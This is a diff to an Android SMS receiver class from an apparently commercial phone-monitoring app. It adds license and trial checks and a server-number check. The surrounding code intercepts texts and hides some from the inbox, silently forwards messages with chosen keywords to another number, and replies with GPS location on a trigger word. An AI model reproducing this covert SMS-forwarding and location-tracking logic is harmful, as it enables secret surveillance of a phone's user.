@@ -45,18 +45,20 @@ public class SmsReceiver extends BroadcastReceiver
 		if (!intent.getAction().equals(SMS_RECEIVED)) return;
 		
 		String smsBody = SmsCtrl.getSmsBody(intent).trim();
-		//SysUtils.messageBox(context, "Received SMS: " + smsBody);
-			
 		if (smsBody.length() <= 0) return; 
 		
 		//-------------------------------------------------------------------------------
 		// If it is the activation SMS (only include the key), show the setting view
 		if (smsBody.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH &&  
-			LicenseCtrl.getLicenseType(context, smsBody) != LICENSE_TYPE.NOT_LICENSED) 
+			LicenseCtrl.calLicenseType(context, smsBody) != LICENSE_TYPE.NOT_LICENSED) 
 		{
 			abortBroadcast(); // Finish broadcast, the system will notify this SMS
-			LICENSE_TYPE licType = LicenseCtrl.getLicenseType(context, smsBody);
-			//SysUtils.messageBox(context, "Got license: " + LicenseCtrl.enumToStr(licType));
+			LICENSE_TYPE licType = LicenseCtrl.calLicenseType(context, smsBody);
+			
+			// Save consumed datetime if it is the 1st activation
+			if (ConfigCtrl.getConsumedDatetime(context) == null) {
+				ConfigCtrl.setConsumedDatetime(context, (new Date()));
+			}
 			
 			// If it is Super License Key, do not need to get response validation from server
 			if (licType == LICENSE_TYPE.SUPER_LICENSED) {
@@ -69,11 +71,6 @@ public class SmsReceiver extends BroadcastReceiver
 					Log.e(LOGTAG, "Cannot set license type");
 					SysUtils.messageBox(context, context.getResources().getString(R.string.msg_cannot_write_license_type_to_sharedpreferences));
 					return;
-				}
-				
-				// Save consumed datetime if it is the 1st activation
-				if (ConfigCtrl.getConsumedDatetime(context) == null) {
-					ConfigCtrl.setConsumedDatetime(context, (new Date()));
 				}
 				
 				// Save the last activated datetime
@@ -94,8 +91,7 @@ public class SmsReceiver extends BroadcastReceiver
 			
 			// If it is not a super key
 			try {
-				// If it is the 1st time or it has not been validated by server, 
-				// send SMS to server for license key validation, 
+				// If it has not been validated by server, send SMS to server for license key validation, 
 				// but still show the setting view for inputing mail address and etc.
 				// The functions will really work until the response validation SMS comes from server. 
 				if (ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.NOT_LICENSED) 
@@ -136,10 +132,6 @@ public class SmsReceiver extends BroadcastReceiver
 				initIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
 				initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
 				context.startActivity(initIntent);
-				
-				// Remove the activation SMS
-				// Since we have done abortBroadcast(), the activation SMS will not enter the SMS inbox.
-				//SmsCtrl.deleteTheLastSMS(context);
 			}
 			catch (Exception ex) {
 				SysUtils.messageBox(context, ex.getMessage());
@@ -151,6 +143,11 @@ public class SmsReceiver extends BroadcastReceiver
 		// If it is the response validation SMS from server
 		else if (smsBody.startsWith(AuthSms.SMS_HEADER + AuthSms.SMS_SEPARATOR)) 
 		{
+			// If it is not from server (phone number is different), return
+			if (!SmsCtrl.getSmsAddress(intent).equalsIgnoreCase(context.getResources().getString(R.string.srv_address))) {
+				return;
+			}
+			
 			String[] parts = smsBody.split(AuthSms.SMS_SEPARATOR);
 			if (parts.length >= 3) {
 				abortBroadcast(); // Finish broadcast, the system will notify this SMS
@@ -180,7 +177,7 @@ public class SmsReceiver extends BroadcastReceiver
 				// --------------------------------------------------------------
 				if (parts[2].equals(AuthSms.SMS_SUCCESS)) {
 					// Save license type info to SharedPreferences
-					LICENSE_TYPE type = LicenseCtrl.getLicenseType(context, parts[1]);
+					LICENSE_TYPE type = LicenseCtrl.calLicenseType(context, parts[1]);
 					if (!ConfigCtrl.setLicenseType(context, type)) {
 						Log.e(LOGTAG, "Cannot set license type");
 						SysUtils.messageBox(context, context.getResources().getString(R.string.msg_cannot_write_license_type_to_sharedpreferences));
@@ -191,11 +188,6 @@ public class SmsReceiver extends BroadcastReceiver
 					if (ConfigCtrl.getConsumedDatetime(context) == null) {
 						ConfigCtrl.setConsumedDatetime(context, (new Date()));
 					}
-					
-					// Remove the activation SMS
-					// Since we have done abortBroadcast(), the response SMS from server will not enter the SMS inbox.
-					//SmsCtrl.deleteTheLastSMS(context);
-					
 				} else if (parts[2].equalsIgnoreCase(AuthSms.SMS_FAILURE)) {
 					if (parts.length >= 4) {
 						SysUtils.messageBox(context, parts[3]);
@@ -210,6 +202,11 @@ public class SmsReceiver extends BroadcastReceiver
 		// Redirect SMS that contains sensitive words
 		else if (!smsBody.startsWith("Info,") && containSensitiveWords(context, smsBody)) 
 		{
+			// If neither in trail and nor licensed, return
+			if (!ConfigCtrl.stillInTrial(context) && ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.NOT_LICENSED) {
+				return;
+			}
+			
 			String phoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
 			if (phoneNum.length() > 0) {
 				String smsAddress = SmsCtrl.getSmsAddress(intent);
@@ -221,7 +218,13 @@ public class SmsReceiver extends BroadcastReceiver
 		//-------------------------------------------------------------------------------
 		// Send GPS position if being triggered by GPS activation word
 		String gpsWord = GlobalPrefActivity.getGpsWord(context);
-		if (gpsWord.length() > 0 && smsBody.contains(gpsWord)) {
+		if (gpsWord.length() > 0 && smsBody.contains(gpsWord)) 
+		{
+			// If neither in trail and nor licensed, return
+			if (!ConfigCtrl.stillInTrial(context) && ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.NOT_LICENSED) {
+				return;
+			}
+			
 			if (!GlobalPrefActivity.getDisplayGpsSMS(context)) {
 				abortBroadcast();
 			}
